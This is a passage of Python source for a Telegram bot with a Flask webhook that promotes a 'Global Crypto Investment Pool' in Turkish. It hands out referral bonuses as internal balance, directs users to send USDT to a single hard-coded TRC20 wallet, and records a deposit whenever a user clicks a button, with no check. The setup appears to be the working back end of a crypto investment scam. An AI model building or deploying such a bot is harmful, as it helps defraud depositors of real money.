            key = conn.execute("SELECT * FROM keys WHERE key_string=?", (ref_code,)).fetchone()
            if key and key["active"] and key["uses"] < key["max_uses"] and key["owner_id"] != user.id:
                referrer_id = key["owner_id"]
                conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (ref_code,))
                conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user.id,))
                conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (referrer_id,))

        conn.execute("INSERT INTO users (user_id, balance, invested, locked_balance, has_gold_key, referrer_id) VALUES (?, 0.0, 0.0, 0.0, 0, ?)", (user.id, referrer_id))
        conn.commit()
    conn.close()

    keyboard = [
        [InlineKeyboardButton("🚀 Mini App Aç", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton("💎 USDT Yatırım Yap", callback_data="buy_usdt")]
    ]
    await update.message.reply_text(f"Selam {user.first_name}! Global Kripto Yatırım Havuzuna Hoş Geldin. 🌐", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == "buy_usdt":
        keyboard = [[InlineKeyboardButton("💳 USDT Gönderdim / Bildir", callback_data="report_usdt")]]
        await query.message.reply_text("Yatırım için TRC20 cüzdan adresine **USDT** gönderin:\n\n`TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    elif query.data == "report_usdt":
        conn = get_db()
        conn.execute("INSERT INTO payments (user_id, tx_info) VALUES (?, ?)", (user_id, "TRC20 USDT Yatırımı Yapıldı"))
        conn.commit()
        conn.close()
        await query.message.reply_text("✅ Kripto transfer bildirimi sisteme işlendi.")

telegram_app = Application.builder().token(TOKEN).build()
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CallbackQueryHandler(button_handler))

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    import asyncio
    async def process():
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.initialize()
        await telegram_app.process_update(update)
    asyncio.run(process())
    return "OK", 200

if __name__ == '__main__':
    webhook_url = f"{WEBAPP_URL}/{TOKEN}"
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}")
        logger.info(f"Webhook başarıyla tanımlandı: {webhook_url}")
    except Exception as e:
        logger.error(f"Webhook ayarlanamadı: {e}")

    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
